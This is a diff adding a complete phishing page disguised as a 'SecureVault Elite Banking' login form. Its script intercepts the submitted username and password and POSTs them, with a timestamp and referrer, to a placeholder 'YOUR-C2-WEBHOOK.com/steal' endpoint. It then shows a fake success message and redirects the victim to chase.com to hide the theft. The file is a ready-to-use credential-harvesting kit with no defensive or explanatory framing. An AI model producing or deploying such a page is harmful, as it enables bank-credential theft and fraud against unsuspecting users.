@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureVault Elite Banking</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: #fff; margin: 0; padding: 0; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        header { text-align: center; padding: 40px 0; }
+        .logo { font-size: 2.5em; font-weight: bold; color: #00ff9d; }
+        .form-container { background: rgba(255,255,255,0.1); padding: 40px; border-radius: 15px; max-width: 500px; margin: 0 auto; backdrop-filter: blur(10px); }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; background: #1a1a2e; color: #fff; }
+        button { width: 100%; padding: 15px; background: #00ff9d; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #00cc7a; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header><div class="logo">SecureVault</div><p>Elite Banking • 2026</p></header>
+        <div class="form-container">
+            <h2>Secure Login</h2>
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Username/Email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            fetch('https://YOUR-C2-WEBHOOK.com/steal', {
+                method: 'POST',
+                body: JSON.stringify({u, p, time: Date.now(), ref: document.referrer})
+            });
+            alert('Success! Redirecting...');
+            window.location = 'https://chase.com';
+        });
+    </script>
+</body>
+</html>
